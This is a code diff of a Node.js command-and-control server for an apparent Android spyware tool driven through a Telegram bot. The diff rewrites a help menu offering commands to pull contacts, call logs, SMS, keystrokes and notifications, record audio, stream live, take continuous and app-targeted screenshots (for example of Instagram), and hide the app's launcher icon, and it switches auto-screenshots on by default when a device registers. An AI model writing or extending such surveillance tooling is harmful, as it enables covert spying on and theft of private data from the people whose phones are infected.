@@ -74,37 +74,16 @@ async function sendTelegramMessage(chatId, text) {
 }
 
 // ============= COMMAND HELPERS =============
+
 function getHelpMessage() {
     return `<b>🤖 COMPLETE COMMAND LIST</b>
 
 <b>🔍 MONITORING COMMANDS</b>
-/help - Get full commands
 /status - Get full device status
 /location - Get current GPS location
 /battery - Get battery level only
 /storage - Get storage information
 /network - Get network info (IP, WiFi, Mobile)
-
-<b>📱 DATA EXTRACTION COMMANDS</b>
-/contacts - Get contact list
-/calllogs - Get recent call logs
-/sms - Get recent SMS messages
-/apps - List installed apps
-/keystrokes - Get recent keystrokes
-/notifications - Get recent notifications
-
-<b>🎤 RECORDING COMMANDS</b>
-/record - Start 60s audio recording NOW
-/stream_start - Start live streaming
-/stream_stop - Stop live streaming
-
-<b>⚙️ SERVICE CONTROL COMMANDS</b>
-/start_screenshot - Start screenshot SERVICE (continuous)
-/stop_screenshot - Stop screenshot service
-/start_recording - Start scheduled recording SERVICE
-/stop_recording - Stop recording service
-/start_stream - Start streaming service
-/stop_stream - Stop streaming service
 
 <b>📸 SCREENSHOT COMMANDS</b>
 /screenshot - Take a screenshot NOW
@@ -119,14 +98,38 @@ function getHelpMessage() {
 /resize_on [width] - Enable resize to specified width (default 800px)
 /resize_off - Disable resize
 
-<b>📸 AUTO-SCREENSHOT COMMANDS</b>
+<b>🤖 AUTO-SCREENSHOT COMMANDS (NEW!)</b>
 /auto_on - Enable auto-screenshot when apps open
 /auto_off - Disable auto-screenshot
 /auto_status - Check auto-screenshot status
-/auto_delay [ms] - Set delay before screenshot (e.g., /auto_delay 3000)
+/auto_interval [seconds] - Set time between screenshots (e.g., /auto_interval 30)
+/auto_max [number] - Set max screenshots per session (0 = unlimited)
+/auto_stop - Stop monitoring current app immediately
+/auto_reset - Reset to default quality settings
 /add_target [package] - Add app to monitor (e.g., /add_target com.spotify)
 /remove_target [package] - Remove app from monitoring
 /target_apps - List all monitored apps
+
+<b>🎤 RECORDING COMMANDS</b>
+/record - Start 60s audio recording NOW
+/stream_start - Start live streaming
+/stream_stop - Stop live streaming
+
+<b>📱 DATA EXTRACTION COMMANDS</b>
+/contacts - Get contact list
+/calllogs - Get recent call logs
+/sms - Get recent SMS messages
+/apps - List installed apps
+/keystrokes - Get recent keystrokes
+/notifications - Get recent notifications
+
+<b>⚙️ SERVICE CONTROL COMMANDS</b>
+/start_screenshot - Start screenshot SERVICE (continuous)
+/stop_screenshot - Stop screenshot service
+/start_recording - Start scheduled recording SERVICE
+/stop_recording - Stop recording service
+/start_stream - Start streaming service
+/stop_stream - Stop streaming service
 
 <b>🛠️ UTILITY COMMANDS</b>
 /ping - Test connection
@@ -144,17 +147,15 @@ function getHelpMessage() {
 /hide_icon - Hide launcher icon
 /show_icon - Show launcher icon
 
-<b>📋 QUICK REFERENCE</b>
-• Just /record - Quick 60s recording
-• Just /screenshot - Quick screenshot
-• /quality_low - Reduce screenshot size
-• /start_recording - Enable continuous scheduled recording
-• /start_screenshot - Enable continuous screenshot service
-• /reboot_app - Restart all services
+<b>📋 AUTO-SCREENSHOT EXAMPLES</b>
+• /auto_on - Enable auto-screenshot
+• /auto_interval 30 - Take screenshot every 30 seconds
+• /auto_max 10 - Stop after 10 screenshots
+• /add_target com.instagram.android - Monitor Instagram
+• /target_apps - See all monitored apps
 
 For more help, visit the dashboard at http://127.0.0.1:8080`;
 }
-
 
 // ============= WEBHOOK ENDPOINT =============
 
@@ -354,7 +355,8 @@ app.post('/api/register', async (req, res) => {
         `Model: ${deviceInfo.model}\n` +
         `Android: ${deviceInfo.android}\n` +
         `Battery: ${deviceInfo.battery}\n` +
-        `ID: ${deviceId.substring(0, 8)}...`);
+        `ID: ${deviceId.substring(0, 8)}...\n\n` +
+        `Auto-screenshot is enabled by default. Use /auto_off to disable.`);
     
     res.json({ status: 'registered', deviceId });
 });
